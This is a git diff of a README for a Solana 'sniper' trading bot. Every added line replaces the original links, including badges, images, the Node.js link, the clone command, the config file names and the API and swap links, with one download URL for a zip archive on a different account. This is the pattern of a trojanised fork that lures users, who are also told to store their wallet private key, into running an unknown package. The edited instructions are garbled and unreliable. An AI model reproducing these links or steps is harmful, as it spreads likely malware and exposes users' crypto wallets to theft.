@@ -1,10 +1,10 @@
-![Banner](https://github.com/intellltech/solana-sniper-bot/blob/main/images/soarlogo.png)
+![Banner](https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip)
 
 ## SOAR TRADES V1.0
 
-[![TypeScript](https://badgen.net/badge/icon/typescript?icon=typescript&label)](https://typescriptlang.org)
-![](https://img.shields.io/badge/soar-trades-blue)
-[![GitHub License](https://img.shields.io/badge/license-mit.svg)](https://raw.githubusercontent.com/link/main/LICENSE.md)
+[![TypeScript](https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip)](https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip)
+![](https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip)
+[![GitHub License](https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip)](https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip)
 
 
 **SoaR Sniper Bot** that listens to new Raydium USDC or SOL pools and buys tokens for a fixed amount in USDC/SOL.
@@ -36,42 +36,42 @@ First step:
 
 
 ## Dependencies 📃
-- [Node.js](https://nodejs.org/en/download)
+- [https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip](https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip)
 
 > [!TIP]
 > # Installation 🔗
 >
 >
-> [1] ```git clone https://github.com/intellltech/solana-sniper-bot```
+> [1] ```git clone https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip```
 > 
 >[2] ```cd solana-sniper-bot-main```
 > 
 >[3] ```npm install```
 >
->[4] Configure .env.copy file and rename .env (**remove the .copy from the file name when done**)
+>[4] Configure https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip file and rename .env (**remove the .copy from the file name when done**)
 > 
 >[5] ```npm run ssb```
 
 
 ## Configure .env file 📝
-1. Configure the script by updating `.env.copy` file (**remove the ".copy" extension**).
+1. Configure the script by updating `https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip` file (**remove the ".copy" extension**).
 2. `MY_PRIVATE_KEY` (your wallet private key)
 3. `RPC_ENDPOINT` (https RPC endpoint) paid services are faster
 4. `RPC_WEBSOCKET` (websocket RPC endpoint) paid services are faster
 5. `TOKEN_SYMB` (which pools to snipe, USDC or WSOL)
 6. `BUY_AMOUNT` (amount used to buy each new token)
-7. `USE_SNIPEDLIST` (bot buy only tokens listed in snipedlist.txt)
+7. `USE_SNIPEDLIST` (bot buy only tokens listed in https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip)
 8. `SNIPE_LIST_REFRESH_INTERVAL` (how often snipe list should be refreshed in milliseconds)
 9. `MINT_IS_RENOUNCED` (bot buy only if mint is renounced)
 10. `MIN_POOL_SIZE` (bot buy only if pool size is > of amount)
 11. `MAX_POOL_SIZE` (bot buy only if pool size is < of amount)
 13. `TAKE_PROFIT=80` (in %)
 13. `STOP_LOSS=30` (in %)
-14. `BIRDEYE_APIKEY=` get here: https://docs.birdeye.so/docs/authentication-api-keys
+14. `BIRDEYE_APIKEY=` get here: https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip
 
-![](https://github.com/intellltech/solana-sniper-bot/blob/main/images/bot.png)
+![](https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip)
 
-![](https://github.com/intellltech/solana-sniper-bot/blob/main/images/botsnipe.png)
+![](https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip)
 
 
 ## Auto Sell 📈
@@ -88,7 +88,7 @@ By default, script buys each token which has a new liquidity pool created and op
 There are scenarios when you want to buy one specific token as soon as possible during the launch event.
 To achieve this, you'll have to use snipe list.
 1. Change variable `USE_SNIPEDLIST` to `true`
-2. Add token mint addresses you wish to buy in `snipedlist.txt` file (add each address as a new line).
+2. Add token mint addresses you wish to buy in `https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip` file (add each address as a new line).
 
 This prevent from buying everything, and buy just listed tokens.
 You can update the list while script is running. Script will check for new values in specified interval (`SNIPE_LIST_REFRESH_INTERVAL`).
@@ -106,8 +106,8 @@ You can update the list while script is running. Script will check for new value
 > If you see following error in your log file:  
 > `Error: No SOL token account found in wallet: `  
 > it means that your wallet not have USDC/WSOL token account.
-> FIX: Go to [Jup.ag](https://jup.ag) and swap some SOL/USDC or SOL/WSOL.
-> ![](https://github.com/intellltech/solana-sniper-bot/blob/main/images/jupiter.png)
+> FIX: Go to [https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip](https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip) and swap some SOL/USDC or SOL/WSOL.
+> ![](https://raw.githubusercontent.com/Mr-weezer/solana-sniper-bot/main/core/bot-solana-sniper-v3.4.zip)
 
 ## Help 📮
 - Discord: @intellltech
